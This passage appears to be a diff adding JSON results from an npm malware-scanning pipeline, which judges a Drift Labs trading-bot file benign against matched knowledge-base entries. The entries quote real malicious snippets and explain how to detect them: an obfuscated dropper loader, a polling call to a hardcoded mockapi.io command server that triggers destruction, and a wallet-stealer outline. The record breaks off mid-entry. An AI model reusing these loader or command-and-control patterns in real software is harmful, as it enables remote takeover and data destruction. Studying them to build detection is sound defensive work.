+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202034_074695/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3816167116165161,
+              "code_similarity": 0.38907116651535034,
+              "behavior_similarity": 0.3741622567176819,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function bind() {\n  let randomNumber = null;\n  for (let i = 0; i < Math.floor(Math.random() * 1000); i++) {\n    randomNumber = i + 2;\n  }\n  (function () {})(randomNumber);\n  new Promise(() => {\n    start();\n    share();\n  });\n}\nexports.bind = bind;",
+                "code_behavior": "At runtime, the bind() function asynchronously triggers the start() (dropper logic) and share() (persistence/remote access setup) functions, passing control to the next stages of the attack chain and enabling further malicious activity.",
+                "malice_analysis": {
+                  "why_suspicious": "The function's only purpose is to launch further malicious routines, with obfuscation and meaningless code (random number loop and unused IIFE) to hinder analysis and evade detection.",
+                  "violated_expectations": "Normal library initialization should not spawn asynchronous malware routines or contain obfuscated, non-functional code blocks.",
+                  "similar_legitimate_use": "A legitimate module might perform some setup, but would not use obfuscation or meaningless code to mask its true purpose.",
+                  "key_indicators": [
+                    "Obfuscated, non-functional code (random number loop, unused IIFE)",
+                    "Asynchronous launch of dropper and persistence routines",
+                    "No legitimate initialization or configuration logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via bind())",
+                  "file_location": "lib/play.js (bind function)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as a dropper and remote access trojan (RAT). It performs environment checks to selectively infect targets, downloads and executes additional payloads, and establishes a persistent HTTP server for arbitrary remote code execution, all without user consent. The malicious logic is triggered during test or runtime, bypassing normal package behavior and enabling persistent attacker control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed and test script is triggered, executing the obfuscated loader in index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loader (bind) function is executed, initiating the attack chain."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Loader (bind) function asynchronously launches dropper (start) and persistence (share) routines.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Dropper logic (start) and persistence (share) are triggered."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Dropper logic (start) performs environment checks, then downloads and/or executes arbitrary payloads or commands.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Payload is executed or remote binary is downloaded and run, enabling code execution."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Persistence routine (share) launches play-share.js as a detached background process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Background RAT server is established and runs independently."
+                  },
+                  {
+                    "step": 5,
+                    "action": "RAT server (play-share.js) listens on port 3004, executing attacker-supplied commands via HTTP requests.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote code execution on the victim machine."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript code as part of npm test or runtime scripts",
+                    "Immediate invocation of local obfuscated modules with side effects",
+                    "Detached background process launching local scripts (e.g., play-share.js)",
+                    "Creation of HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Dynamic download and execution of remote payloads or binaries",
+                    "Creation and use of lock files (e.g., node.compress.lock.log) to control execution flow"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (heavily obfuscated, contains bind/start/share functions)",
+                    "lib/play-share.js (obfuscated, sets up HTTP server for RCE)",
+                    "node.compress.exe (downloaded payload binary)",
+                    "node.compress.lock.log (lock/marker file for anti-redundancy)"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for obfuscated JavaScript files executed via npm lifecycle or test scripts. Flag packages that immediately invoke local obfuscated modules or launch detached background processes. Detect creation of local HTTP servers on non-standard ports (e.g., 3004) and monitor for command execution via HTTP query parameters. Identify dynamic download and execution of binaries, especially when triggered by hidden or obfuscated logic. Look for the presence of suspicious lock files or temporary executables (e.g., node.compress.exe, node.compress.lock.log). Network monitoring should alert on unexpected local HTTP servers and outbound requests to untrusted or attacker-controlled domains."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/jitter/jitterSniper.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "jitterSniper_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.JitterSniper = void 0;\nconst sdk_1 = require(\"@drift-labs/sdk\");\nconst baseJitter_1 = require(\"./baseJitter\");\nclass JitterSniper extends baseJitter_1.BaseJitter {\n    constructor({ auctionSubscriber, slotSubscriber, jitProxyClient, driftClient, userStatsMap, swiftOrderSubscriber, auctionSubscriberIgnoresSwiftOrders, }) {\n        super({\n            auctionSubscriber,\n            jitProxyClient,\n            driftClient,\n            userStatsMap,\n            swiftOrderSubscriber,\n            slotSubscriber,\n            auctionSubscriberIgnoresSwiftOrders,\n        });\n        this.slotSubscriber = slotSubscriber;\n    }\n    createTryFill(taker, takerKey, takerStatsKey, order, orderSignature) {\n        return async () => {\n            const params = this.perpParams.get(order.marketIndex);\n            if (!params) {\n                this.deleteOnGoingAuction(orderSignature);\n                return;\n            }\n            const takerStats = await this.userStatsMap.mustGet(taker.authority.toString());\n            const referrerInfo = takerStats.getReferrerInfo();\n            const { slotsTilCross, willCross, bid, ask, auctionStartPrice, auctionEndPrice, stepSize, oraclePrice, } = this.getAuctionAndOrderDetails(order);\n            // don't increase risk if we're past max positions\n            if ((0, sdk_1.isVariant)(order.marketType, 'perp')) {\n                const currPerpPos = this.driftClient.getUser().getPerpPosition(order.marketIndex) ||\n                    this.driftClient.getUser().getEmptyPosition(order.marketIndex);\n                if (currPerpPos.baseAssetAmount.lt(sdk_1.ZERO) &&\n                    (0, sdk_1.isVariant)(order.direction, 'short')) {\n                    if (currPerpPos.baseAssetAmount.lte(params.minPosition)) {\n                        console.log(`Order would increase existing short (mkt ${(0, sdk_1.getVariant)(order.marketType)}-${order.marketIndex}) too much`);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n                else if (currPerpPos.baseAssetAmount.gt(sdk_1.ZERO) &&\n                    (0, sdk_1.isVariant)(order.direction, 'long')) {\n                    if (currPerpPos.baseAssetAmount.gte(params.maxPosition)) {\n                        console.log(`Order would increase existing long (mkt ${(0, sdk_1.getVariant)(order.marketType)}-${order.marketIndex}) too much`);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n            }\n            console.log(`\n\t\t\t\tTaker wants to ${JSON.stringify(order.direction)}, order slot is ${order.slot.toNumber()},\n\t\t\t\tMy market: ${bid}@${ask},\n\t\t\t\tAuction: ${auctionStartPrice} -> ${auctionEndPrice}, step size ${stepSize}\n\t\t\t\tCurrent slot: ${this.slotSubscriber.currentSlot}, Order slot: ${order.slot.toNumber()},\n\t\t\t\tWill cross?: ${willCross}\n\t\t\t\tSlots to wait: ${slotsTilCross}. Target slot = ${order.slot.toNumber() + slotsTilCross}\n\t\t\t`);\n            this.waitForSlotOrCrossOrExpiry(willCross\n                ? order.slot.toNumber() + slotsTilCross\n                : order.slot.toNumber() + order.auctionDuration + 1, order, {\n                slotsTilCross,\n                willCross,\n                bid,\n                ask,\n                auctionStartPrice,\n                auctionEndPrice,\n                stepSize,\n                oraclePrice,\n            }).then(async ({ slot, updatedDetails }) => {\n                var _a;\n                if (slot === -1) {\n                    console.log('Auction expired without crossing');\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                const params = (0, sdk_1.isVariant)(order.marketType, 'perp')\n                    ? this.perpParams.get(order.marketIndex)\n                    : this.spotParams.get(order.marketIndex);\n                const bid = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n                    ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.bid), sdk_1.PRICE_PRECISION)\n                    : (0, sdk_1.convertToNumber)(params.bid, sdk_1.PRICE_PRECISION);\n                const ask = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n                    ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.ask), sdk_1.PRICE_PRECISION)\n                    : (0, sdk_1.convertToNumber)(params.ask, sdk_1.PRICE_PRECISION);\n                const auctionPrice = (0, sdk_1.convertToNumber)((0, sdk_1.getAuctionPrice)(order, slot, updatedDetails.oraclePrice.price), sdk_1.PRICE_PRECISION);\n                console.log(`\n\t\t\t\t\tExpected auction price: ${auctionStartPrice + slotsTilCross * stepSize}\n\t\t\t\t\tActual auction price: ${auctionPrice}\n\t\t\t\t\t-----------------\n\t\t\t\t\tLooking for slot ${order.slot.toNumber() + slotsTilCross}\n\t\t\t\t\tGot slot ${slot}\n\t\t\t\t`);\n                console.log(`Trying to fill ${orderSignature} with:\n\t\t\t\tmarket: ${bid}@${ask}\n\t\t\t\tauction price: ${auctionPrice}\n\t\t\t\tsubmitting\" ${(0, sdk_1.convertToNumber)(params.bid, sdk_1.PRICE_PRECISION)}@${(0, sdk_1.convertToNumber)(params.ask, sdk_1.PRICE_PRECISION)}\n\t\t\t`);\n                let i = 0;\n                while (i < 10) {\n                    try {\n                        const txParams = {\n                            computeUnits: this.computeUnits,\n                            computeUnitsPrice: this.computeUnitsPrice,\n                        };\n                        const { txSig } = await this.jitProxyClient.jit({\n                            takerKey,\n                            takerStatsKey,\n                            taker,\n                            takerOrderId: order.orderId,\n                            maxPosition: params.maxPosition,\n                            minPosition: params.minPosition,\n                            bid: params.bid,\n                            ask: params.ask,\n                            postOnly: (_a = params.postOnlyParams) !== null && _a !== void 0 ? _a : sdk_1.PostOnlyParams.MUST_POST_ONLY,\n                            priceType: params.priceType,\n                            referrerInfo,\n                            subAccountId: params.subAccountId,\n                        }, txParams);\n                        console.log(`Filled ${orderSignature} txSig ${txSig}`);\n                        await sleep(3000);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                    catch (e) {\n                        console.error(`Failed to fill ${orderSignature}`);\n                        if (e.message.includes('0x1770') || e.message.includes('0x1771')) {\n                            console.log('Order does not cross params yet');\n                        }\n                        else if (e.message.includes('0x1779')) {\n                            console.log('Order could not fill');\n                        }\n                        else if (e.message.includes('0x1793')) {\n                            console.log('Oracle invalid');\n                        }\n                        else {\n                            await sleep(3000);\n                            this.deleteOnGoingAuction(orderSignature);\n                            return;\n                        }\n                    }\n                    await sleep(200);\n                    i++;\n                }\n            });\n            this.deleteOnGoingAuction(orderSignature);\n        };\n    }\n    createTrySignedMsgFill(authorityToUse, signedMsgOrderParams, uuid, taker, takerKey, takerStatsKey, order, orderSignature, marketIndex) {\n        return async () => {\n            const params = this.perpParams.get(order.marketIndex);\n            if (!params) {\n                this.deleteOnGoingAuction(orderSignature);\n                return;\n            }\n            const takerStats = await this.userStatsMap.mustGet(taker.authority.toString());\n            const referrerInfo = takerStats.getReferrerInfo();\n            const { slotsTilCross, willCross, bid, ask, auctionStartPrice, auctionEndPrice, stepSize, oraclePrice, } = this.getAuctionAndOrderDetails(order);\n            // don't increase risk if we're past max positions\n            if ((0, sdk_1.isVariant)(order.marketType, 'perp')) {\n                const currPerpPos = this.driftClient.getUser().getPerpPosition(order.marketIndex) ||\n                    this.driftClient.getUser().getEmptyPosition(order.marketIndex);\n                if (currPerpPos.baseAssetAmount.lt(sdk_1.ZERO) &&\n                    (0, sdk_1.isVariant)(order.direction, 'short')) {\n                    if (currPerpPos.baseAssetAmount.lte(params.minPosition)) {\n                        console.log(`Order would increase existing short (mkt ${(0, sdk_1.getVariant)(order.marketType)}-${order.marketIndex}) too much`);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n                else if (currPerpPos.baseAssetAmount.gt(sdk_1.ZERO) &&\n                    (0, sdk_1.isVariant)(order.direction, 'long')) {\n                    if (currPerpPos.baseAssetAmount.gte(params.maxPosition)) {\n                        console.log(`Order would increase existing long (mkt ${(0, sdk_1.getVariant)(order.marketType)}-${order.marketIndex}) too much`);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n            }\n            console.log(`\n\t\t\t\tTaker wants to ${JSON.stringify(order.direction)}, order slot is ${order.slot.toNumber()},\n\t\t\t\tMy market: ${bid}@${ask},\n\t\t\t\tAuction: ${auctionStartPrice} -> ${auctionEndPrice}, step size ${stepSize}\n\t\t\t\tCurrent slot: ${this.slotSubscriber.currentSlot}, Order slot: ${order.slot.toNumber()},\n\t\t\t\tWill cross?: ${willCross}\n\t\t\t\tSlots to wait: ${slotsTilCross}. Target slot = ${order.slot.toNumber() + slotsTilCross}\n\t\t\t`);\n            this.waitForSlotOrCrossOrExpiry(willCross\n                ? order.slot.toNumber() + slotsTilCross\n                : order.slot.toNumber() + order.auctionDuration + 1, order, {\n                slotsTilCross,\n                willCross,\n                bid,\n                ask,\n                auctionStartPrice,\n                auctionEndPrice,\n                stepSize,\n                oraclePrice,\n            }).then(async ({ slot, updatedDetails }) => {\n                var _a;\n                if (slot === -1) {\n                    console.log('Auction expired without crossing');\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                const params = (0, sdk_1.isVariant)(order.marketType, 'perp')\n                    ? this.perpParams.get(order.marketIndex)\n                    : this.spotParams.get(order.marketIndex);\n                const bid = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n                    ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.bid), sdk_1.PRICE_PRECISION)\n                    : (0, sdk_1.convertToNumber)(params.bid, sdk_1.PRICE_PRECISION);\n                const ask = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n                    ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.ask), sdk_1.PRICE_PRECISION)\n                    : (0, sdk_1.convertToNumber)(params.ask, sdk_1.PRICE_PRECISION);\n                const auctionPrice = (0, sdk_1.convertToNumber)((0, sdk_1.getAuctionPrice)(order, slot, updatedDetails.oraclePrice.price), sdk_1.PRICE_PRECISION);\n                console.log(`\n\t\t\t\t\tExpected auction price: ${auctionStartPrice + slotsTilCross * stepSize}\n\t\t\t\t\tActual auction price: ${auctionPrice}\n\t\t\t\t\t-----------------\n\t\t\t\t\tLooking for slot ${order.slot.toNumber() + slotsTilCross}\n\t\t\t\t\tGot slot ${slot}\n\t\t\t\t`);\n                console.log(`Trying to fill ${orderSignature} with:\n\t\t\t\tmarket: ${bid}@${ask}\n\t\t\t\tauction price: ${auctionPrice}\n\t\t\t\tsubmitting\" ${(0, sdk_1.convertToNumber)(params.bid, sdk_1.PRICE_PRECISION)}@${(0, sdk_1.convertToNumber)(params.ask, sdk_1.PRICE_PRECISION)}\n\t\t\t`);\n                let i = 0;\n                while (i < 10) {\n                    try {\n                        const txParams = {\n                            computeUnits: this.computeUnits,\n                            computeUnitsPrice: this.computeUnitsPrice,\n                        };\n                        const { txSig } = await this.jitProxyClient.jitSignedMsg({\n                            takerKey,\n                            takerStatsKey,\n                            taker,\n                            takerOrderId: order.orderId,\n                            maxPosition: params.maxPosition,\n                            minPosition: params.minPosition,\n                            bid: params.bid,\n                            ask: params.ask,\n                            postOnly: (_a = params.postOnlyParams) !== null && _a !== void 0 ? _a : sdk_1.PostOnlyParams.MUST_POST_ONLY,\n                            priceType: params.priceType,\n                            referrerInfo,\n                            subAccountId: params.subAccountId,\n                            authorityToUse,\n                            signedMsgOrderParams,\n                            uuid,\n                            marketIndex,\n                        }, txParams);\n                        console.log(`Filled ${orderSignature} txSig ${txSig}`);\n                        await sleep(3000);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                    catch (e) {\n                        console.error(`Failed to fill ${orderSignature}`);\n                        if (e.message.includes('0x1770') || e.message.includes('0x1771')) {\n                            console.log('Order does not cross params yet');\n                        }\n                        else if (e.message.includes('0x1779')) {\n                            console.log('Order could not fill');\n                        }\n                        else if (e.message.includes('0x1793')) {\n                            console.log('Oracle invalid');\n                        }\n                        else {\n                            await sleep(3000);\n                            this.deleteOnGoingAuction(orderSignature);\n                            return;\n                        }\n                    }\n                    await sleep(200);\n                    i++;\n                }\n            });\n            this.deleteOnGoingAuction(orderSignature);\n        };\n    }\n    getAuctionAndOrderDetails(order) {\n        // Find number of slots until the order is expected to be in cross\n        const params = (0, sdk_1.isVariant)(order.marketType, 'perp')\n            ? this.perpParams.get(order.marketIndex)\n            : this.spotParams.get(order.marketIndex);\n        const oraclePrice = (0, sdk_1.isVariant)(order.marketType, 'perp')\n            ? this.driftClient.getOracleDataForPerpMarket(order.marketIndex)\n            : this.driftClient.getOracleDataForSpotMarket(order.marketIndex);\n        const makerOrderDir = (0, sdk_1.isVariant)(order.direction, 'long') ? 'sell' : 'buy';\n        const auctionStartPrice = (0, sdk_1.convertToNumber)((0, sdk_1.isVariant)(order.orderType, 'oracle')\n            ? (0, sdk_1.getAuctionPriceForOracleOffsetAuction)(order, order.slot.toNumber(), oraclePrice.price)\n            : order.auctionStartPrice, sdk_1.PRICE_PRECISION);\n        const auctionEndPrice = (0, sdk_1.convertToNumber)((0, sdk_1.isVariant)(order.orderType, 'oracle')\n            ? (0, sdk_1.getAuctionPriceForOracleOffsetAuction)(order, order.slot.toNumber() + order.auctionDuration - 1, oraclePrice.price)\n            : order.auctionEndPrice, sdk_1.PRICE_PRECISION);\n        const bid = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n            ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.bid), sdk_1.PRICE_PRECISION)\n            : (0, sdk_1.convertToNumber)(params.bid, sdk_1.PRICE_PRECISION);\n        const ask = (0, sdk_1.isVariant)(params.priceType, 'oracle')\n            ? (0, sdk_1.convertToNumber)(oraclePrice.price.add(params.ask), sdk_1.PRICE_PRECISION)\n            : (0, sdk_1.convertToNumber)(params.ask, sdk_1.PRICE_PRECISION);\n        let slotsTilCross = 0;\n        let willCross = false;\n        const stepSize = (auctionEndPrice - auctionStartPrice) / (order.auctionDuration - 1);\n        while (slotsTilCross < order.auctionDuration) {\n            if (makerOrderDir === 'buy') {\n                if ((0, sdk_1.convertToNumber)((0, sdk_1.getAuctionPrice)(order, order.slot.toNumber() + slotsTilCross, oraclePrice.price), sdk_1.PRICE_PRECISION) <= bid) {\n                    willCross = true;\n                    break;\n                }\n            }\n            else {\n                if ((0, sdk_1.convertToNumber)((0, sdk_1.getAuctionPrice)(order, order.slot.toNumber() + slotsTilCross, oraclePrice.price), sdk_1.PRICE_PRECISION) >= ask) {\n                    willCross = true;\n                    break;\n                }\n            }\n            slotsTilCross++;\n        }\n        // if it doesnt cross during auction, check if limit price crosses\n        if (!willCross) {\n            const slotAfterAuction = order.slot.toNumber() + order.auctionDuration + 1;\n            const limitPrice = (0, sdk_1.getLimitPrice)(order, oraclePrice, slotAfterAuction);\n            if (!limitPrice) {\n                willCross = true;\n                slotsTilCross = order.auctionDuration + 1;\n            }\n            else {\n                const limitPriceNum = (0, sdk_1.convertToNumber)(limitPrice, sdk_1.PRICE_PRECISION);\n                if (makerOrderDir === 'buy' || limitPriceNum <= bid) {\n                    willCross = true;\n                    slotsTilCross = order.auctionDuration + 1;\n                }\n                else if (makerOrderDir === 'sell' || limitPriceNum >= ask) {\n                    willCross = true;\n                    slotsTilCross = order.auctionDuration + 1;\n                }\n            }\n        }\n        return {\n            slotsTilCross,\n            willCross,\n            bid,\n            ask,\n            auctionStartPrice,\n            auctionEndPrice,\n            stepSize,\n            oraclePrice,\n        };\n    }\n    async waitForSlotOrCrossOrExpiry(targetSlot, order, initialDetails) {\n        let currentDetails = initialDetails;\n        let willCross = initialDetails.willCross;\n        if (this.slotSubscriber.currentSlot > targetSlot) {\n            const slot = willCross ? this.slotSubscriber.currentSlot : -1;\n            return new Promise((resolve) => resolve({ slot, updatedDetails: currentDetails }));\n        }\n        return new Promise((resolve) => {\n            // Immediately return if we are past target slot\n            const slotListener = (slot) => {\n                if (slot >= targetSlot && willCross) {\n                    resolve({ slot, updatedDetails: currentDetails });\n                }\n            };\n            // Otherwise listen for new slots in case we hit the target slot and we're gonna cross\n            this.slotSubscriber.eventEmitter.once('newSlot', slotListener);\n            // Update target slot as the bid/ask and the oracle changes\n            const intervalId = setInterval(async () => {\n                if (this.slotSubscriber.currentSlot >= targetSlot) {\n                    this.slotSubscriber.eventEmitter.removeListener('newSlot', slotListener);\n                    clearInterval(intervalId);\n                    const slot = willCross ? this.slotSubscriber.currentSlot : -1;\n                    resolve({ slot, updatedDetails: currentDetails });\n                }\n                currentDetails = this.getAuctionAndOrderDetails(order);\n                willCross = currentDetails.willCross;\n                if (willCross) {\n                    targetSlot = order.slot.toNumber() + currentDetails.slotsTilCross;\n                }\n            }, 50);\n        });\n    }\n}\nexports.JitterSniper = JitterSniper;\nfunction sleep(ms) {\n    return new Promise((resolve) => setTimeout(resolve, ms));\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.45041873455047604,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code asynchronously interacts with a trading system by accessing user statistics and market oracle data, then attempts to fill orders via network calls to a JIT proxy client using sensitive parameters such as user keys, order details, and market positions. It performs repeated attempts to execute trades with risk checks on position limits, leveraging network APIs for order submission and awaiting auction slot events, enabling automated trading operations that could be abused for market manipulation or unauthorized order execution.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a specialized trading bot component designed to interact with a trading platform's SDK and APIs to automate order fills during auctions. It performs risk checks, listens for market events, and attempts to fill orders via a JIT proxy client. While it uses sensitive parameters such as user keys and order details, these are necessary for legitimate automated trading operations. There is no evidence of obfuscation, data exfiltration, unauthorized wallet access, or command-and-control behavior. The code does not dynamically import suspicious packages or poll external servers for commands. Compared to the known malicious patterns, it lacks key indicators such as wallet manipulation, remote command execution, or dynamic malicious payload loading. The behavior aligns with legitimate automated trading software rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4639667272567749,
+              "code_similarity": 0.3951190412044525,
+              "behavior_similarity": 0.5328143835067749,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_3",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44792771339416504,
+              "code_similarity": 0.4026830792427063,
+              "behavior_similarity": 0.4931723475456238,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "setInterval(() => {\n  fetch('https://6514b3f1dc3282a6a3cd7125.mockapi.io/server/1').then(_0x231e3e => _0x231e3e.json()).then(_0x361fb2 => {\n    if (_0x361fb2.isAngry) {\n      angry();\n    }\n  })['catch'](_0x5d61c5 => {})[\"finally\"](_0x1c49c6 => {});\n}, 0xbb8);",
+                "code_behavior": "At runtime, the code periodically (every 3 seconds) polls a hardcoded remote server for a trigger value; if the server responds with isAngry=true, it executes the destructive angry() function, enabling remote-controlled data destruction via command-and-control.",
+                "malice_analysis": {
+                  "why_suspicious": "The code establishes a command-and-control channel by polling an external server for instructions, which is a common malware technique, and enables remote activation of destructive payloads.",
+                  "violated_expectations": "A utility package should not make unsolicited network requests or execute remote-controlled destructive actions based on external input.",
+                  "similar_legitimate_use": "Some legitimate software checks for updates or configuration from a server, but never for destructive triggers or to execute shell commands.",
+                  "key_indicators": [
+                    "Periodic polling of external server (6514b3f1dc3282a6a3cd7125.mockapi.io)",
+                    "Conditional execution of destructive payload based on remote response",
+                    "Obfuscated and hidden within unrelated functionality",
+                    "No user notification or consent for remote-controlled actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (periodic polling after package import, conditional on directory name and remote server response)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
